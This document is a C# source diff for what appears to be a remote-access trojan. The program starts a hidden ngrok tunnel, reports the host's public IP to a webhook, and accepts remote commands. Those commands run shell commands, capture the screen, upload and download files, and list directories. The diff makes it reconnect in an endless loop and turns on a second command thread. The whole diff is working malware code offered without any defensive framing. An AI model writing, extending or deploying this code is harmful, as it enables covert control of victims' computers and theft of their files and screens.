@@ -24,6 +24,8 @@ using static System.Windows.Forms.DataFormats;
 
 public class Program
 {
+    public static bool RUNPROGRAM = true;
+
     //debug setting
 
     //end
@@ -84,7 +86,7 @@ public class Program
             S1l14lx3.RunMain = true;
             S1l14lx3.RunSub = true;
             S1l14lx3.MainThread.Start();
-            //S1l14lx3.SubThread.Start();
+            S1l14lx3.SubThread.Start();
 
             Tools.Wait();
         }
@@ -113,140 +115,151 @@ public class S1l14lx3
 
     public static async void MAIN_THREAD()
     {
-        Process Fprocess = new Process();
-        Fprocess.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
-        Fprocess.StartInfo.Arguments = $"config add-authtoken {Import.NGROKTOKEN}";
-        Fprocess.StartInfo.CreateNoWindow = true;
-        Fprocess.StartInfo.UseShellExecute = false;
-        Fprocess.StartInfo.RedirectStandardOutput = true;
-        Fprocess.Start();
-        Fprocess.WaitForExit();
-
-        Process process = new Process();
-        process.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
-        process.StartInfo.Arguments = "tcp 59183";
-        process.StartInfo.CreateNoWindow = true;
-        process.StartInfo.UseShellExecute = false;
-        process.StartInfo.RedirectStandardOutput = true;
-        process.Start();
-
-        string externalIpString = new WebClient().DownloadString("https://ipinfo.io/ip");
-        var externalIp = IPAddress.Parse(externalIpString);
-
-        await S1l14lx3_Module.WEBHOOK_POST("Process started \\n# [Ngrok dashboard](https://dashboard.ngrok.com/tunnels/agents)");
-        await S1l14lx3_Module.WEBHOOK_POST($"Client IP : ```{externalIp}```");
-
-        serverSocket.Start();
-        clientSocket = serverSocket.AcceptTcpClient();
-        networkStream = clientSocket.GetStream();
-
-        // メッセージを返信
-        /*/
-        byte[] messageBytes = Encoding.UTF8.GetBytes("{CONTENT}");
-        networkStream.Write(messageBytes, 0, messageBytes.Length);
-        /*/
-
-        string BeforeCMD = "";
-        while (RunMain)
+        while (true)
         {
-            //listen
-            byte[] buffer = new byte[1024];
-            int bytesRead = networkStream.Read(buffer, 0, buffer.Length);
-            string GetCommand = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+            Process Fprocess = new Process();
+            Fprocess.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
+            Fprocess.StartInfo.Arguments = $"config add-authtoken {Import.NGROKTOKEN}";
+            Fprocess.StartInfo.CreateNoWindow = true;
+            Fprocess.StartInfo.UseShellExecute = false;
+            Fprocess.StartInfo.RedirectStandardOutput = true;
+            Fprocess.Start();
+            Fprocess.WaitForExit();
 
-            if (GetCommand == "Error")
+            Process process = new Process();
+            process.StartInfo.FileName = Import.Dir + @"Tunnel.exe";
+            process.StartInfo.Arguments = "tcp 59183";
+            process.StartInfo.CreateNoWindow = true;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.Start();
+
+            string externalIpString = new WebClient().DownloadString("https://ipinfo.io/ip");
+            var externalIp = IPAddress.Parse(externalIpString);
+
+            await S1l14lx3_Module.WEBHOOK_POST("Process started \\n# [Ngrok dashboard](https://dashboard.ngrok.com/tunnels/agents)");
+            await S1l14lx3_Module.WEBHOOK_POST($"Client IP : ```{externalIp}```");
+
+            serverSocket.Start();
+            clientSocket = serverSocket.AcceptTcpClient();
+            networkStream = clientSocket.GetStream();
+
+            // メッセージを返信
+            /*/
+            byte[] messageBytes = Encoding.UTF8.GetBytes("{CONTENT}");
+            networkStream.Write(messageBytes, 0, messageBytes.Length);
+            /*/
+
+            string BeforeCMD = "";
+            while (RunMain)
             {
-                continue;
-            }
-            string[] Command = { };
-            RemoteCommand data = JsonConvert.DeserializeObject<RemoteCommand>(GetCommand);
-            if (data == null)
-            {
-                continue;
-            }
-            else
-            {
-                Command = new string[] { data.Command, Tools.Base64Decode(data.Option), data.Roop.ToString() };
-            }
-            if (GetCommand == BeforeCMD)
-            {
-                continue;
-            }
-            else if (GetCommand == "")
-            {
-                continue;
-            }
-            BeforeCMD = GetCommand;
-            switch (Command[0])
-            {
-                //Windows Command Prompt
-                case "wcp":
-                    ModuleThread = new Thread(S1l14lx3_Module.WCP);
-                    ModuleThread.Start(Command);
-                    break;
-                //Screen Capture
-                case "scc":
-                    ModuleThread = new Thread(S1l14lx3_Module.SCC);
-                    ModuleThread.Start(Command);
-                    break;
-                //File upload
-                case "upload":
-                    ModuleThread = new Thread(S1l14lx3_Module.UPLOAD);
-                    ModuleThread.Start(Command);
-                    break;
-                //File download
-                case "download":
-                    ModuleThread = new Thread(S1l14lx3_Module.DOWNLOAD);
-                    ModuleThread.Start(Command);
-                    break;
-                //Directory & File List
-                case "d&fl":
-                    ModuleThread = new Thread(S1l14lx3_Module.DFL);
-                    ModuleThread.Start(Command);
-                    break;
-                //Toast Message
-                case "message":
-                    ModuleThread = new Thread(S1l14lx3_Module.TOAST);
-                    ModuleThread.Start(Command);
-                    break;
-                //Beep
-                case "beep":
-                    ModuleThread = new Thread(S1l14lx3_Module.BEEP);
-                    ModuleThread.Start(Command);
-                    break;
-                //Debug
-                case "?":
-                    Console.WriteLine(await S1l14lx3_Module.WEBHOOK_POST("生きてるよ (debug用)"));
-                    byte[] messageBytes = Encoding.UTF8.GetBytes("Online");
-                    networkStream.Write(messageBytes, 0, messageBytes.Length);
-                    break;
-                /*/TCP console (没)
-                case "console":
-                    ModuleThread = new Thread(S1l14lx3_Module.CONSOLE);
-                    ModuleThread.Start(Command);
-                    break;
-                /*/
-                //Stop
-                case "stop":
-                    ModuleThread.Abort();
-                    break;
-                //Exit
-                case "exit":
-                    networkStream.Close();
-                    clientSocket.Close();
-                    serverSocket.Stop();
-                    await S1l14lx3_Module.WEBHOOK_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
-                    Environment.Exit(0);
-                    break;
-                //Default
-                default:
+                //listen
+                byte[] buffer = new byte[1024];
+                int bytesRead = networkStream.Read(buffer, 0, buffer.Length);
+                string GetCommand = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+
+                if (GetCommand == "Error")
+                {
                     continue;
-                    /*/
-                       //Comment
-                    case "CMD":
-                        //Code
+                }
+                string[] Command = { };
+                RemoteCommand data = JsonConvert.DeserializeObject<RemoteCommand>(GetCommand);
+                if (data == null)
+                {
+                    continue;
+                }
+                else
+                {
+                    Command = new string[] { data.Command, Tools.Base64Decode(data.Option), data.Roop.ToString() };
+                }
+                if (GetCommand == BeforeCMD)
+                {
+                    continue;
+                }
+                else if (GetCommand == "")
+                {
+                    continue;
+                }
+                BeforeCMD = GetCommand;
+                switch (Command[0])
+                {
+                    //Windows Command Prompt
+                    case "wcp":
+                        ModuleThread = new Thread(S1l14lx3_Module.WCP);
+                        ModuleThread.Start(Command);
+                        break;
+                    //Screen Capture
+                    case "scc":
+                        ModuleThread = new Thread(S1l14lx3_Module.SCC);
+                        ModuleThread.Start(Command);
+                        break;
+                    //File upload
+                    case "upload":
+                        ModuleThread = new Thread(S1l14lx3_Module.UPLOAD);
+                        ModuleThread.Start(Command);
+                        break;
+                    //File download
+                    case "download":
+                        ModuleThread = new Thread(S1l14lx3_Module.DOWNLOAD);
+                        ModuleThread.Start(Command);
+                        break;
+                    //Directory & File List
+                    case "d&fl":
+                        ModuleThread = new Thread(S1l14lx3_Module.DFL);
+                        ModuleThread.Start(Command);
+                        break;
+                    //Toast Message
+                    case "message":
+                        ModuleThread = new Thread(S1l14lx3_Module.TOAST);
+                        ModuleThread.Start(Command);
+                        break;
+                    //Beep
+                    case "beep":
+                        ModuleThread = new Thread(S1l14lx3_Module.BEEP);
+                        ModuleThread.Start(Command);
+                        break;
+                    //Debug
+                    case "?":
+                        Console.WriteLine(await S1l14lx3_Module.WEBHOOK_POST("生きてるよ (debug用)"));
+                        byte[] messageBytes = Encoding.UTF8.GetBytes("Online");
+                        networkStream.Write(messageBytes, 0, messageBytes.Length);
+                        break;
+                    /*/TCP console (没)
+                    case "console":
+                        ModuleThread = new Thread(S1l14lx3_Module.CONSOLE);
+                        ModuleThread.Start(Command);
                         break;
                     /*/
+                    //Stop
+                    case "stop":
+                        ModuleThread.Abort();
+                        break;
+                    //Close
+                    case "close":
+                        networkStream.Close();
+                        clientSocket.Close();
+                        serverSocket.Stop();
+                        await S1l14lx3_Module.WEBHOOK_POST($"Disconected\\nID : ```{Import.ID}```");
+                        RunSub = false;
+                        break;
+                    //Exit
+                    case "exit":
+                        networkStream.Close();
+                        clientSocket.Close();
+                        serverSocket.Stop();
+                        await S1l14lx3_Module.WEBHOOK_POST($"プログラムを終了しました\\nID : ```{Import.ID}```");
+                        Environment.Exit(0);
+                        break;
+                    //Default
+                    default:
+                        continue;
+                        /*/
+                           //Comment
+                        case "CMD":
+                            //Code
+                            break;
+                        /*/
+                }
             }
         }
     }
@@ -282,7 +295,7 @@ public class S1l14lx3
         /*/
 
         string BeforeCMD = "";
-        while (RunMain)
+        while (RunSub)
         {
             //listen
             byte[] buffer = new byte[1024];
@@ -364,12 +377,20 @@ public class S1l14lx3
                 case "stop":
                     ModuleThread.Abort();
                     break;
+                //Close
+                case "close":
+                    networkStream.Close();
+                    clientSocket.Close();
+                    serverSocket.Stop();
+                    await S1l14lx3_Module.WEBHOOK_POST($"Disconected\\nID : ```{Import.ID}```");
+                    RunMain = false;
+                    break;
                 //Exit
                 case "exit":
                     networkStream.Close();
                     clientSocket.Close();
                     serverSocket.Stop();
-                    await S1l14lx3_Module.WEBHOOK_POST($"プログラムを終了しました\nID : ```{Import.ID}```");
+                    await S1l14lx3_Module.WEBHOOK_POST($"プログラムを終了しました\\nID : ```{Import.ID}```");
                     Environment.Exit(0);
                     break;
                 //Default
